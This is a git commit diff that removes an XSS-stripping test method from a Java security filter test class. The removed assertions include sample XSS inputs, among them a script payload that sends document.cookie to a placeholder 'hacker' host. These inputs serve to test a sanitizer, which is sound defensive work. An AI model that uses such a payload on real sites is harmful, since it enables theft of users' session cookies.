2385bb848ef59072da5d2011940bc1597bfbf0e6
smt.eric <edamschroder@siliconmtn.com>
2021-03-15 15:17:42 -0400

    fix(ossh-01): remove unneeded tests

--- src/test/java/com/siliconmtn/io/api/security/XSSFilterTest.java
+++ src/test/java/com/siliconmtn/io/api/security/XSSFilterTest.java
@@ -2,11 +2,8 @@ package com.siliconmtn.io.api.security;
 
 import static org.mockito.Mockito.mock;
 import static org.mockito.Mockito.when;
-import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
-import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
 
 import java.io.BufferedReader;
-import java.io.IOException;
 import java.io.Reader;
 import java.io.StringReader;
 
@@ -14,18 +11,14 @@ import javax.servlet.FilterChain;
 import javax.servlet.ServletResponse;
 import javax.servlet.http.HttpServletRequest;
 
-import org.apache.commons.io.IOUtils;
 // Junit 5
 import org.junit.jupiter.api.Test;
-import org.springframework.beans.factory.annotation.Autowired;
-import org.springframework.test.web.servlet.MockMvc;
-import org.springframework.test.web.servlet.setup.MockMvcBuilders;
-import org.springframework.web.context.WebApplicationContext;
 
 public class XSSFilterTest {
 	
 	/**
-	 * Ensure that the filter can run without throwing any errors
+	 * Ensure that the filter can run without throwing any errors, 
+	 * actual XSS Striping testing comes from it's own test class.
 	 * @throws Exception
 	 */
 	@Test
@@ -47,20 +40,6 @@ public class XSSFilterTest {
         when(wrappedRequest.getReader()).thenReturn(reader);
 
         xss.doFilter(request, response, chain);
-        
-	}
-	
-	/**
-	 * Check the actual stripXSS functionality, checking to see if it removes html tags,
-	 * entire script tags, 
-	 * @throws Exception
-	 */
-	@Test
-	public void testXSSStripping() throws Exception {
-
-        assert(XSSRequestWrapper.stripXSS("<span>test</span>").equals("test"));
-        assert(XSSRequestWrapper.stripXSS("<p>Your search for 'flowers <script>evil_script()</script>").equals("Your search for 'flowers"));
-        assert(XSSRequestWrapper.stripXSS( "<SCRIPT>var+img=new+Image(); img.src=\"http://hacker/\"%20+%20document.cookie;</SCRIPT>").equals(""));
         
 	}
 	
